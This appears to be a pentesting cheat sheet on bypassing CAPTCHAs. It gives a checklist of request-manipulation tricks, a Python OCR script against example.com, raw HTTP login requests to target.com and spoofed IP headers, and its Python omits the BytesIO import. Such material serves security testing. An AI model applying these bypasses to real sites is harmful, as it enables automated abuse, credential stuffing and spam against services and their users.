# CAPTCHA

[**Captcha Bypass via response manipulation**](https://bugcrowd.com/disclosures/55b40919-2c02-402c-a2cc-7184349926d7/login-capctha-bypass)

It seems like you're looking for a way to handle CAPTCHA on a website for an automation task. Here’s a structured approach based on your points:

1. **Do not send the parameter related to the CAPTCHA.**
   * [ ] When making a request, omit the CAPTCHA parameter entirely to see how the server responds.
2. **Change from POST to GET or other HTTP Verbs.**
   * [ ] Experiment with changing the HTTP method of your request from POST to GET, or try other methods like PUT or DELETE, depending on what the endpoint supports.
3. **Change to JSON or from JSON.**
   * [ ] If the request is currently sending data as form-encoded, try sending it as JSON instead, or vice versa.
4. **Send the CAPTCHA parameter empty.**
   * [ ] Include the CAPTCHA parameter in the request but leave its value empty to see how the server responds.
5. **Check if the value of the CAPTCHA is in the source code of the page.**
   * [ ] Inspect the HTML source code of the page to see if the CAPTCHA value is embedded directly.
6. **Check if the value is inside a cookie.**
   * [ ] Look for cookies set by the server which might contain the CAPTCHA value or related information.
7. **Try to use an old CAPTCHA value.**
   * [ ] Reuse an old CAPTCHA value to check if it’s still valid.
8. **Check if you can use the same CAPTCHA value several times with the same or different session ID.**
   * [ ] Test the reuse of CAPTCHA values with the same session ID and with different session IDs to see if it’s possible to bypass it.
9. **If the CAPTCHA consists of a mathematical operation, try to automate the calculation.**
   * [ ] Automate the solution of mathematical CAPTCHAs using a script.
10. **If the CAPTCHA consists of reading characters from an image, check manually or with code how many images are being used and if only a few images are being used, detect them by MD5.**
    * [ ] Manually analyze or write a script to identify unique CAPTCHA images and use their MD5 hashes for recognition.
11. **Use an OCR** [**Tesseract OCR**](https://github.com/tesseract-ocr/tesseract)**.**
    * [ ] Use Tesseract OCR to automate the reading of text-based CAPTCHA images.
12. **Online services to bypass CAPTCHAs (e.g., Capsolver).**
    * [ ] Consider using online CAPTCHA solving services like Capsolver.

Here's an example of using Python with requests and Tesseract OCR for handling text-based CAPTCHA images:

```python
import requests
from PIL import Image
import pytesseract

# Function to get CAPTCHA image and solve it
def solve_captcha(image_url):
    response = requests.get(image_url)
    img = Image.open(BytesIO(response.content))
    captcha_text = pytesseract.image_to_string(img)
    return captcha_text.strip()

# Example request without CAPTCHA parameter
response = requests.get("https://example.com/api/endpoint")
print(response.text)

# Example request with empty CAPTCHA parameter
response = requests.post("https://example.com/api/endpoint", data={"captcha": ""})
print(response.text)

# Example request with CAPTCHA parameter solved using OCR
captcha_text = solve_captcha("https://example.com/captcha/image")
response = requests.post("https://example.com/api/endpoint", data={"captcha": captcha_text})
print(response.text)
```

Ensure you have the necessary permissions and are compliant with the website's terms of service when performing these actions.

## Bypass Captcha (Google reCAPTCHA)



1. Try changing the request method, for example POST to GET

```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```

Change the method to GET

```
GET /?_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123 HTTP 1.1
Host: target.com
...
```

2. Try remove the value of the captcha parameter

```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=&_Username=daffa&_Password=test123
```

3. Try reuse old captcha token

```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=test123
```

4. Convert JSON data to normal request parameter

```
POST / HTTP 1.1
Host: target.com
...

{"_RequestVerificationToken":"xxxxxxxxxxxxxx","_Username":"daffa","_Password":"test123"}
```

Convert to normal request

```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```

5. Try custom header to bypass captcha

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

6. Change some specific characters of the captcha parameter and see if it is possible to bypass the restriction.

```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```

Try this to bypass

```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxdxxxaxxcxxx&_Username=daffa&_Password=test123
```
